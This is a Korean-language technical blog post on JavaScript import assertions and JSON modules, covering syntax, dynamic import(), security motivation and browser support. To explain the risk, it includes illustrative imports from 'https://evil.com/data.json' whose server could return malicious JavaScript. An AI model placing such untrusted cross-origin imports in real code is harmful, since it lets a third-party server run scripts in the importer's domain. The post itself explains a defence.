---
title: &apos;import assertions&apos;
author: &apos;Dan Clark ([@dandclark1](https://twitter.com/dandclark1)), import assertions를 강하게 주장하는 임포터&apos;
avatars:
  - &apos;dan-clark&apos;
date: 2021-06-15
tags:
  - ECMAScript
description: &apos;import assertions를 통해 모듈 임포트 문에서 모듈 지정자와 함께 추가 정보를 포함할 수 있습니다&apos;
tweet: &apos;&apos;
---

새로운 [import assertions](https://github.com/tc39/proposal-import-assertions) 기능을 사용하면 모듈 임포트 문에서 모듈 지정자와 함께 추가 정보를 포함할 수 있습니다. 이 기능의 초기 용도는 JSON 문서를 [JSON 모듈](https://github.com/tc39/proposal-json-modules)로 임포트할 수 있도록 하는 것입니다:

<!--truncate-->
```json
// foo.json
{ "answer": 42 }
```

```javascript
// main.mjs
import json from &apos;./foo.json&apos; assert { type: &apos;json&apos; };
console.log(json.answer); // 42
```

## 배경: JSON 모듈과 MIME 타입

자연스러운 질문 중 하나는 JSON 모듈을 아래와 같이 간단히 임포트할 수는 없는지에 대한 것입니다:

```javascript
import json from &apos;./foo.json&apos;;
```

웹 플랫폼은 모듈 리소스를 실행하기 전에 해당 MIME 타입의 유효성을 검사하며, 이 이론적으로 이 MIME 타입을 사용하여 리소스를 JSON 또는 자바스크립트 모듈로 처리할지 결정할 수 있습니다.

그러나 MIME 타입만으로는 [보안 문제](https://github.com/w3c/webcomponents/issues/839)가 발생할 수 있습니다.

모듈은 교차 출처로 임포트될 수 있으며, 개발자는 외부 소스에서 JSON 모듈을 임포트할 수 있습니다. JSON이 적절히 정제된 경우에는 신뢰할 수 없는 외부에서도 기본적으로 안전하다고 간주할 수 있습니다. JSON을 임포트하면 스크립트를 실행하지 않기 때문입니다.

그러나, 서드파티 서버가 예기치 않은 자바스크립트 MIME 타입 및 악성 자바스크립트 페이로드로 응답하면 실제로 스크립트가 실행될 수 있습니다. 이로 인해 임포터의 도메인에서 코드가 실행될 수 있습니다.

```javascript
// evil.com이 자바스크립트 MIME 타입
// (예: `text/javascript`)으로 응답하면 JS 실행!
import data from &apos;https://evil.com/data.json&apos;;
```

파일 확장자는 모듈 타입을 결정하는 데 사용할 수 없습니다. 왜냐하면 [웹에서 콘텐츠 타입의 신뢰할 수 있는 지표가 아니기 때문입니다](https://github.com/tc39/proposal-import-assertions/blob/master/content-type-vs-file-extension.md). 대신에, 우리는 import assertions를 사용하여 예상 모듈 타입을 지정하고 이러한 권한 상승 문제를 방지합니다.

개발자가 JSON 모듈을 임포트하려면, JSON이어야 한다고 지정하는 import assertion을 사용해야 합니다. 네트워크로부터 받은 MIME 타입이 예상 타입과 일치하지 않으면 임포트는 실패합니다:

```javascript
// evil.com이 JSON이 아닌 MIME 타입으로 응답하면 실패.
import data from &apos;https://evil.com/data.json&apos; assert { type: &apos;json&apos; };
```

## 동적 `import()`

또한 import assertions는 [동적 `import()`](https://v8.dev/features/dynamic-import#dynamic)에 새로운 두 번째 매개변수로 전달할 수 있습니다:

```json
// foo.json
{ "answer": 42 }
```

```javascript
// main.mjs
const jsonModule = await import(&apos;./foo.json&apos;, {
  assert: { type: &apos;json&apos; }
});
console.log(jsonModule.default.answer); // 42
```

JSON 콘텐츠는 모듈의 기본 익스포트이므로 `import()`에서 반환된 객체의 `default` 속성을 통해 참조됩니다.

## 결론

현재 import assertions의 유일한 지정 용도는 모듈 타입을 지정하는 것입니다. 그러나 이 기능은 임의의 키/값 assertion 쌍을 허용하도록 설계되었으므로, 향후 모듈 임포트를 제한하는 데 유용할 경우 추가로 활용 방법이 추가될 수 있습니다.

한편, 새로운 import assertions 문법을 사용한 JSON 모듈은 Chromium 91에서 기본적으로 사용할 수 있습니다. [CSS 모듈 스크립트](https://chromestatus.com/feature/5948572598009856) 또한 같은 모듈 타입 assertion 문법을 사용하여 곧 출시될 예정입니다.

## import assertions 지원

<feature-support chrome="91 https://chromestatus.com/feature/5765269513306112"
                 firefox="no"
                 safari="no"
                 nodejs="no"
                 babel="yes https://github.com/babel/babel/pull/12139"></feature-support>
